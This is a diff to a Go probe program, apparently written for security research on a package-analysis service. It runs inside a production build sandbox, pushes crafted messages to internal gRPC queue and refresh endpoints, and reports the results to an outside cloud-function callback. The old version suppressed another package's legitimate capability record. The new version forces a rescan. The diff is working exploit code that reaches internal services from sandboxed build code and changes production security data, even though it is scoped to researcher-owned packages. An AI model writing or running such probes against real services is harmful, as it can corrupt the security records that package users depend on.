@@ -1,7 +1,7 @@
-// Command queue-roundtrip suppresses the legitimate capability record of one
-// researcher-owned package from a different researcher-owned package in the
-// exact production Capslock compiler lane. The internal action and public
-// transition are pinned and emitted as bounded receipts to one callback.
+// Command queue-roundtrip schedules a fresh analysis of one researcher-owned
+// package from a different researcher-owned package in the exact production
+// Capslock compiler lane. The input action and public restoration are pinned
+// and emitted as bounded receipts to one callback.
 package main
 
 import (
@@ -35,12 +35,12 @@ var callbackURLSHA256 string
 
 const (
 	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion     = "v0.0.127-capability-suppress-codex"
-	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.127-capability-suppress-codex"
-	expectedAgent    = "go-cgo-pkgsite-probe-v127-capability-suppress"
+	probeVersion     = "v0.0.130-capability-rescan-codex"
+	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.130-capability-rescan-codex"
+	expectedAgent    = "go-cgo-pkgsite-probe-v130-capability-rescan"
 	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.8"
-	queueName        = "capslock-capability-result"
-	mutationSource   = "robert-owned-v127-capability-suppression"
+	queueName        = "capslock-capability"
+	mutationSource   = "robert-owned-v130-cross-worker-rescan"
 	restoreSource    = "robert-owned-v127-capability-restore"
 	queueMethod      = "/sos.queue.Queue/Push"
 	restoreMethod    = "/sos.talisman.Talisman/Refresh"
@@ -53,8 +53,8 @@ const (
 	// immutable v0.0.8 module's legitimate non-empty record for 21 samples.
 	cleanSHA256        = "f87d65c5252bd2ffea49dd6f3f76a68165d117ef20053d762af68d172c6f5923"
 	mutatedSHA256      = "14d798f2aadfed6f6a1eb6951221daa65d5e132d402cf9fa35952c0adc9857dd"
-	mutationPushBytes  = 144
-	mutationPushSHA256 = "23514124b033afbbaedcf2777a839cd3adf9135aaf919d420eea79f9439f3873"
+	mutationPushBytes  = 134
+	mutationPushSHA256 = "327758a6203f5c49e3191fe145f73e6fb8b261ccbdf245279e89666c2addd573"
 	restoreFrameBytes  = 103
 	restoreFrameSHA256 = "917e77ef9ffd6c1b77633d285ccbf42d11f78f54650d0a4630c5593a82914912"
 	emptyFrameSHA256   = "8855508aade16ec573d21e6a485dfd0a7624085c1a14b5ecdd6485de0c6839a4"
@@ -241,13 +241,13 @@ func main() {
 
 	started := time.Now()
 	receipt := report{
-		Schema: "owned-capability-suppression/v1", Phase: "final", Module: moduleName,
+		Schema: "owned-capability-rescan/v1", Phase: "final", Module: moduleName,
 		Version: probeVersion, Target: targetCoordinate,
 		ExpectedMutatedSHA256: mutatedSHA256, ExpectedCleanSHA256: cleanSHA256,
 		StartedUTC: started.UTC().Format(time.RFC3339Nano),
 		Identity:   inspectIdentity(origin), Precheck: []publicSample{},
 		Mutation:          emptyQueueReceipt(mutationSource),
-		MutationPublic:    emptyConvergenceReceipt("mutated"),
+		MutationPublic:    emptyConvergenceReceipt("clean"),
 		Restoration:       emptyRefreshReceipt(),
 		RestorationPublic: emptyConvergenceReceipt("clean"),
 	}
@@ -267,8 +267,8 @@ func main() {
 		finishAndSubmit(&receipt)
 		return
 	}
-	if state != "clean" {
-		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_clean"
+	if state != "mutated" {
+		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_suppressed"
 		finishAndSubmit(&receipt)
 		return
 	}
@@ -303,41 +303,20 @@ func main() {
 		return
 	}
 
-	receipt.MutationPublic = runConvergence("mutated", precheckSamples)
+	receipt.MutationPublic = runConvergence("clean", precheckSamples)
 	mutationPublicReport := receipt
 	mutationPublicReport.Phase = "mutation_public"
 	mutationPublicReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
 	receipt.MutationPublicSHA256, err = submitPhase("mutation_public", mutationPublicReport)
 	receipt.MutationPublicCallbackOK = err == nil
 
-	receipt.Restoration = runRefresh(buildRefreshFrame())
-	restorationReport := receipt
-	restorationReport.Phase = "restore_refresh"
-	restorationReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	receipt.RestorationSHA256, err = submitPhase("restore_refresh", restorationReport)
-	receipt.RestorationCallbackOK = err == nil
-
-	restoreOffset := precheckSamples + receipt.MutationPublic.TotalSamples
-	receipt.RestorationPublic = runConvergence("clean", restoreOffset)
-	restorationPublicReport := receipt
-	restorationPublicReport.Phase = "restore_public"
-	restorationPublicReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	receipt.RestorationPublicSHA256, err = submitPhase("restore_public", restorationPublicReport)
-	receipt.RestorationPublicOK = err == nil
-
-	suppressionVerified := receipt.Mutation.Verified && receipt.MutationCallbackOK &&
+	rescanVerified := receipt.Mutation.Verified && receipt.MutationCallbackOK &&
 		receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK
-	restorationVerified := receipt.Restoration.Verified && receipt.RestorationCallbackOK &&
-		receipt.RestorationPublic.Converged && receipt.RestorationPublicOK
-	switch {
-	case suppressionVerified && restorationVerified:
-		receipt.Outcome = "owned_capability_suppression_and_restoration_verified"
-	case restorationVerified:
-		receipt.Outcome = "capability_suppression_not_verified_but_restored"
-		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error, "suppression_receipt_incomplete")
-	default:
-		receipt.Outcome = "restoration_not_verified"
-		receipt.Error = firstNonempty(receipt.Restoration.Error, receipt.RestorationPublic.Error, "restoration_receipt_incomplete")
+	if rescanVerified {
+		receipt.Outcome = "owned_cross_worker_rescan_and_restoration_verified"
+	} else {
+		receipt.Outcome = "cross_worker_rescan_not_verified"
+		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error, "rescan_receipt_incomplete")
 	}
 	finishAndSubmit(&receipt)
 }
@@ -385,7 +364,7 @@ func validateStaticPins() error {
 	zero := strings.Repeat("0", 64)
 	if cleanSHA256 == zero || mutatedSHA256 == zero || cleanSHA256 == mutatedSHA256 ||
 		mutationPushBytes <= 0 || mutationPushSHA256 == zero || restoreFrameBytes <= 0 || restoreFrameSHA256 == zero {
-		return errors.New("suppression pins incomplete")
+		return errors.New("rescan pins incomplete")
 	}
 	mutation, err := buildMutationPush()
 	if err != nil || !matchesRequestPin(mutation, mutationPushBytes, mutationPushSHA256) {
@@ -407,7 +386,7 @@ func validateRuntimeConfiguration() error {
 		return errors.New("invalid callback identity")
 	}
 	parsed, err := url.Parse(callbackBaseURL)
-	expectedPath := "/go-cgo-v127-suppression-codex/v1/session/" + callbackSession
+	expectedPath := "/go-cgo-v130-capability-rescan-codex/v1/session/" + callbackSession
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
 		parsed.Path != expectedPath {
@@ -558,7 +537,7 @@ func fetchPublic(sequence int) (publicSample, error) {
 	result := publicSample{Sequence: sequence, ObservedUTC: time.Now().UTC().Format(time.RFC3339Nano), State: "unknown"}
 	parsed, _ := url.Parse(analysisURL)
 	query := parsed.Query()
-	query.Set("v127_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
+	query.Set("v130_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
 	parsed.RawQuery = query.Encode()
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
@@ -636,13 +615,9 @@ func grpcFrame(payload []byte) []byte {
 }
 
 func buildMutationPush() ([]byte, error) {
-	// A field-1-only CapabilityResultAction is the exact clean result shape
-	// already accepted by production in v121. Here it has a visible effect:
-	// it replaces B's legitimate non-empty record with an empty one.
-	action, err := encodeCapabilityResultAction(targetCoordinate, nil, "")
-	if err != nil {
-		return nil, err
-	}
+	// CapabilityAction contains only the exact owned package coordinate. It is
+	// sent to the input queue so a separate worker performs the normal scan.
+	action := appendStringField(nil, 1, targetCoordinate)
 	return buildQueuePush(mutationSource, action), nil
 }
 
